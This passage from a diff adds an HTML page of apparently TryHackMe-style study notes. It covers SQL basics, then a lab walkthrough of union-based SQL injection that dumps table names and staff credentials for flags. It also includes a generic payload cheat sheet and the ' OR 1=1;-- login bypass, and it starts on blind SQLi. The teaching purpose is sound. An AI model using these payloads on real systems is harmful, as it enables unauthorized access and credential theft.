+<td style="text-align: center;">T6M 2J5</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">id</th>
+<th style="text-align: center;">company</th>
+<th style="text-align: center;">address</th>
+<th style="text-align: center;">city</th>
+<th style="text-align: center;">postal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">1</td>
+<td style="text-align: center;">ACME Co.</td>
+<td style="text-align: center;">52 Gray Avenue</td>
+<td style="text-align: center;">Toronto</td>
+<td style="text-align: center;">Y1T 4B1</td>
+</tr>
+<tr>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">Nova Inc.</td>
+<td style="text-align: center;">125 Stellar Crescent</td>
+<td style="text-align: center;">Vancouver</td>
+<td style="text-align: center;">Y2Z 2J3</td>
+</tr>
+<tr>
+<td style="text-align: center;">3</td>
+<td style="text-align: center;">Brown Consulting</td>
+<td style="text-align: center;">143 Homeward Ave</td>
+<td style="text-align: center;">Edmonton</td>
+<td style="text-align: center;">T6J 1J5</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>By utilizing the UNION statement, we can combine results from the two tables above and put them into a single dataset.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="n">address</span><span class="p">,</span><span class="n">city</span><span class="p">,</span><span class="n">postal</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">customers</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="n">company</span><span class="p">,</span><span class="n">address</span><span class="p">,</span><span class="n">city</span><span class="p">,</span><span class="n">postal</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">vendors</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">name</th>
+<th style="text-align: center;">address</th>
+<th style="text-align: center;">city</th>
+<th style="text-align: center;">postal</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">Jo Shepard</td>
+<td style="text-align: center;">123 53 Street</td>
+<td style="text-align: center;">Edmonton</td>
+<td style="text-align: center;">T1J 4M3</td>
+</tr>
+<tr>
+<td style="text-align: center;">Jane Smith</td>
+<td style="text-align: center;">59 Pulsar Street</td>
+<td style="text-align: center;">Calgary</td>
+<td style="text-align: center;">R2Y 4J1</td>
+</tr>
+<tr>
+<td style="text-align: center;">Paul Rogers</td>
+<td style="text-align: center;">45 Red Street</td>
+<td style="text-align: center;">Edmonton</td>
+<td style="text-align: center;">T6M 2J5</td>
+</tr>
+<tr>
+<td style="text-align: center;">ACME Co.</td>
+<td style="text-align: center;">52 Gray Avenue</td>
+<td style="text-align: center;">Toronto</td>
+<td style="text-align: center;">Y1T 4B1</td>
+</tr>
+<tr>
+<td style="text-align: center;">Nova Inc.</td>
+<td style="text-align: center;">125 Stellar Crescent</td>
+<td style="text-align: center;">Vancouver</td>
+<td style="text-align: center;">Y2Z 2J3</td>
+</tr>
+<tr>
+<td style="text-align: center;">Brown Consulting</td>
+<td style="text-align: center;">143 Homeward Ave</td>
+<td style="text-align: center;">Edmonton</td>
+<td style="text-align: center;">T6J 1J5</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<h4 id="insert">INSERT<a class="headerlink" href="#insert" title="Permanent link">&para;</a></h4>
+<p>The <code>INSERT</code> statement is used to tell the database that we would like to add a new record into the table.</p>
+<p>Consider the users table presented earlier.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">INSERT</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">VALUES</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;bob&#39;</span><span class="p">,</span><span class="s1">&#39;pass&#39;</span><span class="p">);</span>
+</code></pre></div>
+The clause <code>INTO users</code> tells the database which table we wish to insert the new record into. <code>(username,password)</code> provides the column names we are providing the data for and <code>VALUES ('bob','pass')</code> provides the data for the specified columns.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">id</th>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">1</td>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">password123</td>
+</tr>
+<tr>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+<tr>
+<td style="text-align: center;">3</td>
+<td style="text-align: center;">jane</td>
+<td style="text-align: center;">qwerty</td>
+</tr>
+<tr>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">bob</td>
+<td style="text-align: center;">pass</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<h4 id="update">UPDATE<a class="headerlink" href="#update" title="Permanent link">&para;</a></h4>
+<p>The <code>UPDATE</code> statement allows us to update one or more record within a table.</p>
+<p>Consider the statement below. </p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">UPDATE</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">SET</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="n">password</span><span class="o">=</span><span class="s1">&#39;pass123&#39;</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+</code></pre></div>
+<code>UPDATE users</code> tells the database that we would like to update a record in the <em>users</em> table. <code>SET username='root',password='pass123'</code> tells the the database which field needs to be updated and their associated values. <code>WHERE username='admin'</code> specifies the exact row to be updated. The dataset returned would be as follows.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">id</th>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">1</td>
+<td style="text-align: center;">root</td>
+<td style="text-align: center;">pass123</td>
+</tr>
+<tr>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+<tr>
+<td style="text-align: center;">3</td>
+<td style="text-align: center;">jane</td>
+<td style="text-align: center;">qwerty</td>
+</tr>
+<tr>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">bob</td>
+<td style="text-align: center;">pass</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>Note that the username and password fields for <em>admin</em> have been updated respectively.</p>
+<h4 id="delete">DELETE<a class="headerlink" href="#delete" title="Permanent link">&para;</a></h4>
+<p>The <code>DELETE</code> statement allows us to remove specific records for a specified table. <code>LIMIT x</code> can be used to specify the number of rows to be deleted.</p>
+<p>Consider the following statement.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;jane&#39;</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">id</th>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;">1</td>
+<td style="text-align: center;">root</td>
+<td style="text-align: center;">pass123</td>
+</tr>
+<tr>
+<td style="text-align: center;">2</td>
+<td style="text-align: center;">joe</td>
+<td style="text-align: center;">p4ssw0rd</td>
+</tr>
+<tr>
+<td style="text-align: center;">4</td>
+<td style="text-align: center;">bob</td>
+<td style="text-align: center;">pass</td>
+</tr>
+</tbody>
+</table>
+<p><br></p>
+<p>Note that all data from a table can be expunged by omitting the <code>WHERE</code> clause.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="k">DELETE</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span>
+</code></pre></div>
+<br></p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">id</th>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<h2 id="sql-injection">SQL Injection<a class="headerlink" href="#sql-injection" title="Permanent link">&para;</a></h2>
+<p>SQLi is a major yet common attack on web applications which occurs when the application accepts a malicious user input and uses it as part of the SQL statement to query the database.</p>
+<p>Consider the following example URL: <code>https://www.example.com/blog?id=1</code></p>
+<p>Let's assume that the above URL serves blog posts to the user where each blog entry has a unique id number. The blog entries may be marked as public or private to control access. In the URL above, the blog entry is selected using the id parameter. The web application uses the id parameter in an SQL statement to retrieve the requested entry from the database. An example of the SQL statement may resemble the following.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">blog</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">private</span><span class="o">=</span><span class="mi">0</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</code></pre></div>
+Here we are requesting the database to retrieve an entry with id equal to 1 and the private parameter set to 0 from the blog database. The retrieved records are limited to a single match by using the LIMIT 1 clause.</p>
+<p>Let's assume that blog entry with id equal to 2 is locked as private and cannot be accessed by us. If our inputs are not properly sanitized, we can modify and call the URL: <code>https://www.example.com/blog?id=2;--</code></p>
+<p>The vulnerable web application would take the above URL and produce the following SQL statement.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">blog</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span><span class="c1">-- and private=0 LIMIT 1;</span>
+</code></pre></div>
+The semicolon after <code>id=2</code> signifies the end of the SQL statement and the two <code>--</code> causes everything afterwards to be treated as a comment in MySQL. The database in turn executes the above statement as follows.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">blog</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span>
+</code></pre></div>
+This retrieves the blog entry with an id equal 2 which normally we would not be able to see due to it being marked as private.</p>
+<p>The above is a very simple example of basic SQLi vulnerability of a type called In-Band SQL Injection. We will explore this further in the next section.</p>
+<h3 id="in-band-sqli">In-Band SQLi<a class="headerlink" href="#in-band-sqli" title="Permanent link">&para;</a></h3>
+<p>In-band SQL injection occurs when an attacker is able to use the same communication channel to both launch the attack and retrieve the results. In-Band SQL injections are considered to be the most common and the easiest type of SQLi to detect and exploit.</p>
+<p>The two most common types of in-band SQLi are <code>Error-Based SQLi</code> and <code>Union-Based SQLi</code>.</p>
+<ul>
+<li>
+<p>Error-based SQLi rely on error messages created by the database server to obtain information about the structure of the database. This type of SQLi can often be used by an attacker to enumerate an entire database.</p>
+</li>
+<li>
+<p>Union-based SQLi leverages the UNION SQL operator to combine the results of two or more SELECT statements into a single result which is then returned as part of the HTTP response. This method is the most common way to extract large amounts of data via an SQLi vulnerability.</p>
+</li>
+</ul>
+<p>Let's look at a practical example of in-band UNION based SQLi attack using MySQL.</p>
+<p>The key to discovering error-based SQLi is to break the underlying SQL query by trying certain characters until an error message is produced (typically this is most commonly done using single apostrophe <code>'</code> or a quotation mark <code>"</code>).</p>
+<p>Let's place an <code>'</code> after the <code>id=1</code> in the URL. Notice the error message. This indicates that the web application is vulnerable to SQLi (particularly error-based SQLi).</p>
+<p><img alt="SQLi Discover" src="../../../assets/images/thm/sqli/1-errormessage.png" /></p>
+<p>Now that we know that the web application is vulnerable to SQLi, we need to return data to the browser without displaying an error message. By utilizing the UNION operator we can retrieve additional results. Recall that when using UNION, the retrieved dataset must have the same number of columns as the preceding SELECT statement.</p>
+<p>Let's try <code>1 UNION SELECT 1</code> (alternatively we could use <code>1 UNION SELECT null</code> which will yield the same result). Notice that the error message returned indicates that there is a mismatch in the number of columns.</p>
+<p><img alt="Column Mismatch Error" src="../../../assets/images/thm/sqli/2-columnmismatch.png" /></p>
+<p>Let's keep adding columns until the error message disappears.</p>
+<p>At <code>1 UNION SELECT 1,2,3</code> (or <code>1 UNION SELECT null,null,null</code>) the error message disappears and the article is once again displayed. The reason the article is displayed is because the query takes the first returned result in the web application's code and displays it. We can get around this by setting the original SELECT operator to produce no result by changing the article id to either <code>0</code> or <code>-1</code>.</p>
+<p><img alt="Column Matched" src="../../../assets/images/thm/sqli/3-columnmatch.png" /></p>
+<p><img alt="Bypass Article Display" src="../../../assets/images/thm/sqli/4-bypassid.png" /></p>
+<p>We can now dump the list of tables in the active database. We can achieve this by leveraging the fact that we know the database type is MySQL and as such use <code>information_schema</code> which contains information on all the databases and tables.</p>
+<p>This can be accomplished using: <code>-1 UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = database()</code></p>
+<p>In the statement above:
+ - <code>group_concat(table_name)</code> tells the database that we want to retrieve the specific column named <code>table_name</code> from the multiple returned rows and put it into one string separated by commas. 
+ - <code>information_schema.tables</code> tells the database that we are interested in all the tables in the database we have access to.
+ - <code>table_schema = database()</code> indicates which database we would like to retrieve the table names from. In MySQL, <code>database()</code> retrieves the name of the active (or current) database.</p>
+<p><img alt="Table Dump" src="../../../assets/images/thm/sqli/5-tabledump.png" /></p>
+<p>Now that we know the table names in the database, we can proceed with dumping the columns for a specific table. As the purpose of this exercise is to retrieve the password for user <code>martin</code>, we can start with the table <code>staff_users</code>.</p>
+<p>To dump the columns in a table, we can use: <code>-1 UNION SELECT null,null,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'</code></p>
+<p>In the statement above:
+- <code>group_concat(column_name)</code> tells the database that we want to retrieve the <code>column_name</code> from the multiple returned rows and put it into one string separated by commas.
+- <code>information_schema.columns</code> contains information on the columns within the tables the user has access to.
+- <code>table_schema = 'staff_users'</code>  indicates that we wish to retrieve column names for the <code>staff_users</code> table.</p>
+<p><img alt="Column Dump" src="../../../assets/images/thm/sqli/6-columndump.png" /></p>
+<p>Now that we know what columns are present in the <code>staff_users</code> we can retrieve the user's information using <code>-1 UNION SELECT null,null,group_concat(username,':',password SEPARATOR '&lt;br&gt;') FROM staff_users</code>.</p>
+<p>In the statement above, <code>group_concat</code> method returns all the rows into one string to make it easier to read. The <code>':'</code> is used to split username and password from each other. The HTML tag <code>&lt;br&gt;</code> is used to display each result on a separate line instead of being comma separated.</p>
+<p><img alt="User Data Dump" src="../../../assets/images/thm/sqli/7-datadump.png" /></p>
+<p>We can now confirm martin's password to retrieve the flag: <code>THM{SQL_INJECTION_3840}</code></p>
+<p>Let's summarize the steps above into something more general.</p>
+<ol>
+<li>Verify SQLi vulnerability via entry point detection by escaping the current context.
+   <div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="go"> [Nothing]</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="go"> &#39;</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="go"> &quot;</span>
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="go"> `</span>
+<a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="go"> &#39;)</span>
+<a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="go"> &quot;)</span>
+<a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="go"> `)</span>
+<a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="go"> &#39;))</span>
+<a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="go"> &quot;))</span>
+<a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="go"> `))</span>
+</code></pre></div></li>
+<li>Determine the number of columns in the table by using <code>Order/Group by</code> or <code>UNION SELECT</code> (continue to increment or add additional <code>null</code> values until the query is correct).
+   <div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="s1">&#39; ORDER BY 1--    </span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">2</span><span class="c1">--    </span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="s1">&#39; ORDER BY 3--    </span>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="mi">4</span><span class="c1">--    #Error: The ORDER BY position number 3 is out of range of the number of items in the select list.</span>
+</code></pre></div>
+   OR</li>
+</ol>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="s1">&#39; UNION SELECT null--           #Error: All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="c1">--      #Error: All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="c1">-- #Working</span>
+</code></pre></div>
+3. Verify column data type to allow retrieval of the results from an injected query. If the data type of a column is not compatible with string data, the injected query will cause a database error.
+   <div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,null,null--   #Error: Conversion failed when converting the varchar value &#39;</span><span class="n">a</span><span class="s1">&#39; to data type int.</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="k">null</span><span class="c1">--   #Error: Conversion failed when converting the varchar value &#39;a&#39; to data type int.</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="s1">&#39; UNION SELECT null,null,&#39;</span><span class="n">a</span><span class="err">&#39;</span><span class="c1">--   #Working</span>
+</code></pre></div>
+4. Extract database names, table names, column names and data.
+   <div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="o">#</span><span class="w"> </span><span class="k">Database</span><span class="w"> </span><span class="k">Names</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="s1">&#39; UNION SELECT null,null,group_concat(schema_name) FROM information_schema.schemata</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="s1"># Database Name Alternative for Current/Active Database</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="k">database</span><span class="p">()</span>
+<a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>
+<a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a><span class="o">#</span><span class="w"> </span><span class="k">Table</span><span class="w"> </span><span class="k">Names</span>
+<a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a><span class="s1">&#39; UNION SELECT null,null,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#39;</span><span class="n">SPECIFY_DATABASE_NAME</span><span class="s1">&#39;</span>
+<a id="__codelineno-22-9" name="__codelineno-22-9" href="#__codelineno-22-9"></a>
+<a id="__codelineno-22-10" name="__codelineno-22-10" href="#__codelineno-22-10"></a><span class="s1"># Table Names Alternative for Current/Active Database</span>
+<a id="__codelineno-22-11" name="__codelineno-22-11" href="#__codelineno-22-11"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">database</span><span class="p">()</span>
+<a id="__codelineno-22-12" name="__codelineno-22-12" href="#__codelineno-22-12"></a>
+<a id="__codelineno-22-13" name="__codelineno-22-13" href="#__codelineno-22-13"></a><span class="o">#</span><span class="w"> </span><span class="k">Column</span><span class="w"> </span><span class="k">Names</span>
+<a id="__codelineno-22-14" name="__codelineno-22-14" href="#__codelineno-22-14"></a><span class="s1">&#39; UNION SELECT null,null,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#39;</span><span class="n">SPECIFY_TABLE_NAME</span><span class="s1">&#39;</span>
+<a id="__codelineno-22-15" name="__codelineno-22-15" href="#__codelineno-22-15"></a>
+<a id="__codelineno-22-16" name="__codelineno-22-16" href="#__codelineno-22-16"></a><span class="s1"># Retrieve Data</span>
+<a id="__codelineno-22-17" name="__codelineno-22-17" href="#__codelineno-22-17"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">UNION</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">null</span><span class="p">,</span><span class="k">null</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">SPECIFY_COLUMN_NAME</span><span class="p">,</span><span class="n">SPECIFY_COLUMN_NAME</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">SPECIFY_TABLE_NAME</span>
+</code></pre></div></p>
+<h2 id="blind-sqli">Blind SQLi<a class="headerlink" href="#blind-sqli" title="Permanent link">&para;</a></h2>
+<p>Like in-band SQLi,  blind SQL injection (also known as Inferential SQL Injection) arises when a web application is vulnerable to SQLi but the HTTP responses do not contain results of the relevant SQL query or the details of any database error. Blind SQLi requires the attacker to reconstruct the database structure step-by-step by observing the behaviour of the database server and web application. SQL injection techniques like UNION attacks are not as effective in blind SQLi due their reliance on being able to see the results of the injected query but still possible though time consuming.</p>
+<p>There are two variants of blind SQL injection that are commonly used: <code>Content-based Blind SQL Injection</code> and <code>Time-based SQL Injection</code>.</p>
+<p>One of the most common and straightforward applications of blind SQL injection technique is bypassing authentication. </p>
+<h3 id="authentication-bypass">Authentication Bypass<a class="headerlink" href="#authentication-bypass" title="Permanent link">&para;</a></h3>
+<p>In authentication bypass attacks, an attacker is less concerned with retrieving data from the database which makes blind SQLi less complex and time consuming.</p>
+<p>Often web applications with login forms and their underlying databases are developed in a way that isn't interested in the content of the username and password fields but whether the two fields make a matching pair in a specific table. An authentication bypass attack relies on this behaviour to create a database query that replies with a TRUE or FALSE thereby making valid username/password pair enumeration unnecessary.</p>
+<p>Let's look at a practical example of an authentication bypass attack.</p>
+<p>The following example web application requires a correct username and password values in order to authenticate the user. </p>
+<p><img alt="Authentication Bypass" src="../../../assets/images/thm/sqli/8-authbypass.png" /></p>
+<p>In the back end, the web application code produces the following SQL query based on a user's input:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;%username%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;%password%&#39;</span><span class="w"> </span><span class="k">LIMIT</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</code></pre></div>
+The above query returns a TRUE when a matching pair for username and password are found and FALSE when a matching pair is not found. Note that the <code>'%username%'</code> and <code>'%password%'</code> values are taken from the login form fields and as result the initial values in the SQL query above will be blank as these fields are empty by default.</p>
+<p>In order to make the SQL query above always return a TRUE, we can modify the username or password field with the following conditional (boolean) operator which is always true.</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="err">&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="c1">--</span>
+</code></pre></div>
+The <code>OR</code> operator in combination with the always true statement <code>1=1</code> ensures that the query always returns as a TRUE which satisfies the logic condition that the database found a valid username/password pair and that access should be granted. <code>--</code> truncates any proceeding statement from being executed by converting it into a comment. As a result, the original query gets modified to:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w">    </span><span class="c1">-- If injected into username field</span>
+</code></pre></div>
+OR</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w">    </span><span class="c1">-- If injected into password field</span>
+</code></pre></div>
+<br></p>
+<p><img alt="Username Field Injection" src="../../../assets/images/thm/sqli/9-authbypassquery.png" /></p>
+<p>By using this modified SQL query, we are able to bypass any user authentication requirements and acquire the flag: <code>THM{SQL_INJECTION_9581}</code></p>
+<h3 id="content-based-blind-sql-injection">Content-based Blind SQL Injection<a class="headerlink" href="#content-based-blind-sql-injection" title="Permanent link">&para;</a></h3>
+<p>Content-based Blind SQLi (also referred to as Boolean-based Blind SQLi) requires the attacker to observe the behaviour of the database server after making SQL queries containing boolean operators that ask the database <code>TRUE</code> and <code>FALSE</code> statements.</p>
+<p>Consider the following example where a URL, <code>http://example.com/items.php?id=1</code>, sends the following query to the database:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">items</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+</code></pre></div>
+An attacker may manipulate the request and try to inject a query that returns a FALSE:</p>
